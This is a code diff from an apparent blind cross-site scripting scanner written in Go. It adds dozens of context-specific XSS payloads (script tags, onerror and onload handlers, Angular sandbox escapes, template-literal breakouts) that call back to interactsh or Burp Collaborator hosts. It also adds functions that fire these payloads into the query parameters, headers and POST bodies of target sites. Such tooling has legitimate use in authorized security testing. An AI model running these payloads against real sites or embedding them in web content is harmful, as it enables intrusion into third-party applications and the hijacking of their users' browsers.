@@ -2,37 +2,166 @@ package payloads
 
 import (
 	"context"
+	"crypto/md5"
+	"encoding/hex"
 	"encoding/json"
 	"fmt"
 	"net/http"
 	"net/url"
+	"os"
 	"strings"
 	"time"
 
 	"github.com/lcalzada-xor/xxss/pkg/models"
 )
 
-// BlindPayloads returns a list of blind XSS payloads using the callback URL
+// GenerateUniqueCallback creates a unique callback URL with identifier
+// For interactsh/burp collaborator: uses subdomains (param123.c59h6dg.oast.fun)
+// For custom URLs: uses query parameters (?id=param123)
+func GenerateUniqueCallback(baseURL, identifier string) string {
+	// Generate short unique hash from identifier
+	hash := md5.Sum([]byte(identifier))
+	paramID := hex.EncodeToString(hash[:4]) // 8 chars
+
+	// Remove protocol for subdomain construction
+	cleanURL := strings.TrimPrefix(baseURL, "https://")
+	cleanURL = strings.TrimPrefix(cleanURL, "http://")
+
+	// Check if baseURL is interactsh/collaborator compatible
+	if strings.Contains(cleanURL, "oast.fun") ||
+		strings.Contains(cleanURL, "interact.sh") ||
+		strings.Contains(cleanURL, "burpcollaborator.net") {
+		// Use subdomain: param123.c59h6dg.oast.fun
+		return fmt.Sprintf("https://%s.%s", paramID, cleanURL)
+	}
+
+	// For custom URLs, use query parameter
+	if strings.Contains(baseURL, "?") {
+		return fmt.Sprintf("%s&id=%s", baseURL, paramID)
+	}
+	return fmt.Sprintf("%s?id=%s", baseURL, paramID)
+}
+
+// BlindPayloads returns an expanded list of blind XSS payloads using the callback URL
 func BlindPayloads(callbackURL string) []string {
 	return []string{
-		fmt.Sprintf("\"><script src=%s></script>", callbackURL),
-		fmt.Sprintf("\"><img src=x onerror=this.src='%s'>", callbackURL),
-		fmt.Sprintf("javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'%s\\';document.body.appendChild(a)')", callbackURL),
-		fmt.Sprintf("<script>function b(){var a=document.createElement('script');a.src='%s';document.body.appendChild(a);}b();</script>", callbackURL),
+		// Script injection
+		fmt.Sprintf("<script src=%s></script>", callbackURL),
+		fmt.Sprintf("<script>fetch('%s')</script>", callbackURL),
+
+		// Image-based
+		fmt.Sprintf("<img src=%s>", callbackURL),
+		fmt.Sprintf("<img src=x onerror=fetch('%s')>", callbackURL),
+
+		// SVG
+		fmt.Sprintf("<svg onload=fetch('%s')>", callbackURL),
+
+		// Link prefetch (stealthy)
+		fmt.Sprintf("<link rel=prefetch href=%s>", callbackURL),
+
+		// JavaScript URL
+		fmt.Sprintf("javascript:fetch('%s')", callbackURL),
+
+		// DOM-based
+		fmt.Sprintf("<iframe src=%s>", callbackURL),
+
+		// XHR
+		fmt.Sprintf("<script>new Image().src='%s'</script>", callbackURL),
+
+		// Object/Embed
+		fmt.Sprintf("<object data=%s>", callbackURL),
+
+		// Video/Audio
+		fmt.Sprintf("<video src=%s onerror=fetch('%s')>", callbackURL, callbackURL),
+
+		// Meta refresh
+		fmt.Sprintf("<meta http-equiv=refresh content='0;url=%s'>", callbackURL),
+	}
+}
+
+// BlindPayloadsForContext returns context-specific blind XSS payloads
+func BlindPayloadsForContext(callbackURL string, context models.ReflectionContext) []string {
+	switch context {
+	case models.ContextHTML:
+		return []string{
+			fmt.Sprintf("<script src=%s></script>", callbackURL),
+			fmt.Sprintf("<img src=x onerror=fetch('%s')>", callbackURL),
+			fmt.Sprintf("<svg onload=fetch('%s')>", callbackURL),
+			fmt.Sprintf("<iframe src=%s>", callbackURL),
+			fmt.Sprintf("<link rel=prefetch href=%s>", callbackURL),
+			fmt.Sprintf("<object data=%s>", callbackURL),
+		}
+
+	case models.ContextJavaScript, models.ContextJSSingleQuote, models.ContextJSDoubleQuote, models.ContextJSRaw:
+		payloads := []string{
+			fmt.Sprintf(";fetch('%s');//", callbackURL),
+			fmt.Sprintf("</script><script>fetch('%s')</script>", callbackURL),
+		}
+		// Add context-specific escapes
+		if context == models.ContextJSSingleQuote {
+			payloads = append(payloads, fmt.Sprintf("';fetch('%s');//", callbackURL))
+		} else if context == models.ContextJSDoubleQuote {
+			payloads = append(payloads, fmt.Sprintf("\";fetch('%s');//", callbackURL))
+		}
+		return payloads
+
+	case models.ContextAttribute:
+		return []string{
+			fmt.Sprintf("\" onload=fetch('%s') x=\"", callbackURL),
+			fmt.Sprintf("' onload=fetch('%s') x='", callbackURL),
+			fmt.Sprintf("\"><img src=x onerror=fetch('%s')>", callbackURL),
+			fmt.Sprintf("'><img src=x onerror=fetch('%s')>", callbackURL),
+		}
+
+	case models.ContextURL:
+		return []string{
+			fmt.Sprintf("javascript:fetch('%s')", callbackURL),
+			fmt.Sprintf("\"><script>fetch('%s')</script>", callbackURL),
+			fmt.Sprintf("'><script>fetch('%s')</script>", callbackURL),
+		}
+
+	case models.ContextAngular:
+		return []string{
+			fmt.Sprintf("{{constructor.constructor('fetch(\"%s\")')()}}", callbackURL),
+			fmt.Sprintf("{{$on.constructor('fetch(\"%s\")')()}}", callbackURL),
+			fmt.Sprintf("{{[].pop.constructor('fetch(\"%s\")')()}}", callbackURL),
+		}
+
+	case models.ContextTemplateLiteral:
+		return []string{
+			fmt.Sprintf("${fetch('%s')}", callbackURL),
+			fmt.Sprintf("`+fetch('%s')+`", callbackURL),
+		}
+
+	case models.ContextSVG:
+		return []string{
+			fmt.Sprintf("<svg onload=fetch('%s')>", callbackURL),
+			fmt.Sprintf("\"><svg onload=fetch('%s')>", callbackURL),
+		}
+
+	default:
+		// Fallback to generic payloads for unknown contexts
+		return BlindPayloads(callbackURL)
 	}
 }
 
 // InjectBlind performs a fire-and-forget injection of blind XSS payloads
-func InjectBlind(client *http.Client, headers map[string]string, targetURL, param, callbackURL string) {
-	// We don't wait for response analysis for blind XSS, just send the requests
-	payloads := BlindPayloads(callbackURL)
+func InjectBlind(client *http.Client, headers map[string]string, targetURL, param, callbackURL string, verbose bool) int {
+	// Generate unique callback URL for this parameter
+	uniqueURL := GenerateUniqueCallback(callbackURL, param)
+	payloads := BlindPayloads(uniqueURL)
+
+	if verbose {
+		fmt.Fprintf(os.Stderr, "[BLIND] %s → %s (%d payloads)\n", param, uniqueURL, len(payloads))
+	}
 
 	u, err := url.Parse(targetURL)
 	if err != nil {
-		return
+		return 0
 	}
 
 	qs := u.Query()
+	injected := 0
 
 	for _, payload := range payloads {
 		qs.Set(param, payload)
@@ -55,12 +184,23 @@ func InjectBlind(client *http.Client, headers map[string]string, targetURL, para
 				resp.Body.Close()
 			}
 		}(req)
+		injected++
 	}
+
+	return injected
 }
 
 // InjectBlindHeader performs a fire-and-forget injection of blind XSS payloads into headers
-func InjectBlindHeader(client *http.Client, headers map[string]string, targetURL, header, callbackURL string) {
-	payloads := BlindPayloads(callbackURL)
+func InjectBlindHeader(client *http.Client, headers map[string]string, targetURL, header, callbackURL string, verbose bool) int {
+	// Generate unique callback URL for this header
+	uniqueURL := GenerateUniqueCallback(callbackURL, header)
+	payloads := BlindPayloads(uniqueURL)
+
+	if verbose {
+		fmt.Fprintf(os.Stderr, "[BLIND] Header:%s → %s (%d payloads)\n", header, uniqueURL, len(payloads))
+	}
+
+	injected := 0
 
 	for _, payload := range payloads {
 		req, err := http.NewRequest("GET", targetURL, nil)
@@ -85,12 +225,23 @@ func InjectBlindHeader(client *http.Client, headers map[string]string, targetURL
 				resp.Body.Close()
 			}
 		}(req)
+		injected++
 	}
+
+	return injected
 }
 
 // InjectBlindBody performs a fire-and-forget injection of blind XSS payloads into POST body parameters
-func InjectBlindBody(client *http.Client, headers map[string]string, config *models.RequestConfig, param, callbackURL string, params map[string]string) {
-	payloads := BlindPayloads(callbackURL)
+func InjectBlindBody(client *http.Client, headers map[string]string, config *models.RequestConfig, param, callbackURL string, params map[string]string, verbose bool) int {
+	// Generate unique callback URL for this parameter
+	uniqueURL := GenerateUniqueCallback(callbackURL, param)
+	payloads := BlindPayloads(uniqueURL)
+
+	if verbose {
+		fmt.Fprintf(os.Stderr, "[BLIND] Body:%s → %s (%d payloads)\n", param, uniqueURL, len(payloads))
+	}
+
+	injected := 0
 
 	for _, payload := range payloads {
 		// Create a copy of params with the payload
@@ -156,5 +307,8 @@ func InjectBlindBody(client *http.Client, headers map[string]string, config *mod
 				resp.Body.Close()
 			}
 		}(body)
+		injected++
 	}
+
+	return injected
 }
